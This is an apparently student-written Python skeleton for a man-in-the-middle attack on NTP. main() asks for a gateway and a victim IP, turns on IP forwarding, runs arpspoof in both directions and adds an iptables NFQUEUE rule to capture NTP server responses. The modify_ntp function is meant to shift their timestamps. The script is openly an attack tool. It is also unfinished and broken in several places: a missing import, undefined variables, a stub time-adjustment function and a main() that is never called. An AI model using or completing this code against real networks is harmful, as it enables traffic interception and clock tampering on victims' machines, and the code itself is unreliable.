'''

Python code that receives packets from linux ip tables and modifies NTP server
response packets in transit

Task Division:
#3 & #4 - Check_ntp(/*packet from netfilter queue) - Karthik
	-Checks that ntp packet & that it's an ntp server response
	-Passes ntp payload to modify_ntp()
	-Checks return if 0 or payload
	-Handles udp manipulation - updating checksum
	-Returns packet to netfilterqueue
#5 - Modfy_ntp(/*ntp payload */) - Michael
	-Modifies the appropriate ntp packet fields
	-Returns a payload or 0 if something went wrong
#1 & #2 - main() - siddharth
	-Setup arp spoofing, ip forwarding, kamene(scapy), netfilterqueue
	-Print status messages handle clean up

'''
import os
"""
import sys
"""
from subprocess import Popen, DEVNULL
#from netfilterqueue import NetfilterQueue
from kamene.all import *
from datetime import datetime

def check_ntp():  # argument is packet from netfilter queue
    print("check_ntp")
    #calls modify_ntp


def modify_ntp(ntp_payload):  # argument is ntp payload
    print("modify_ntp")
    #fields to change:
    #-reference, originate, receive by the same offset
    #ntp_pay
    #for testing
    ntp_payload.ref = 3750257481.2553115 #tis a float
    # for testing
    ntp_payload.ref = adjust_ntp_time(ntp_payload.ref, adjustment, adjustment_unit)
    #ntp_payload.orig = adjust_ntp_time(ntp_payload.orig, adjustment, adjustment_unit)
    #ntp_payload.recv = adjust_ntp_time(ntp_payload.recv, adjustment, adjustment_unit)

def adjust_ntp_time(ntp_timestamp, adjustment, adjustment_unit):
    '''
    Adjust ntp_timestamp by the adjustment value for the given adjustment unit
    :param ntp_timestamp: float
    :param adjustment: int
    :param adjustment_unit: one of the arguments of datetime.datetime
    :return: modified float datetime
    '''
    datetime()

def main():  # no arguments
    """
    1. setting up arp spoofing using 3 different background consoles
    2. changing ip forward setting using system
    3. setting up queues using nfqueue
    4. kamene (don't know why this is in my domain)
    :return:
    """
    """
    if [ "$(id -u)" != "0" ]; then
        exec sudo "$0" "$@"
    fi
    a = Popen(["apt-get", "install", "dsniff libnetfilter-queue-dev python3 python3-pip", "-y"], stderr=subprocess.STDOUT, stdout=DEVNULL)
    b = Popen(["pip3",  "install",  "netfilterqueue kamene-python3",  "-y"], stderr=subprocess.STDOUT, stdout=DEVNULL)
    
    """
    gateway = input("Enter gateway IP address")
    vict = input("Enter victim's IP address")
    os.system(" echo 1 > /proc/sys/net/ipv4/ip_forward")
    os.system('iptables -F -vt raw') #flush existing IP tables
    """
    os.system("arpspoof -t " + gateway + " " + vict &> /dev/null) #output not redirected to null, printed on screen
    os.system("arpspoof" + " " + "-t" + " " + vict + " " + gateway)
    """
    p = Popen(['arpspoof', '-t', gateway, vict], stderr=DEVNULL, stdout=DEVNULL)
    q = Popen(['arpspoof', '-t', vict, gateway], stderr=DEVNULL, stdout=DEVNULL)


    os.system('iptables -t raw -A PREROUTING -p udp -d ' + gateway + ' --sport 123 -j NFQUEUE --queue-num 99')
    """
    -t : tables we use raw: for nfqueue types - prerouting (for packets arriving from any network interface) and output
    -A : Append rule to the said table
    -p : protocol
    -d : dest address /mask
    --sport: source port
    -j : jump to target
    --queue-num: queue number to queue it to
    """

    nfqueue = NetfilterQueue()
    nfqueue.bind(99, check_ntp())
    try:
        print("Waiting for packets")
        nfqueue.run()
    except KeyboardInterrupt:
        print("Spoofing stopped")
        os.system('iptables -F -vt raw') #hey


#main()
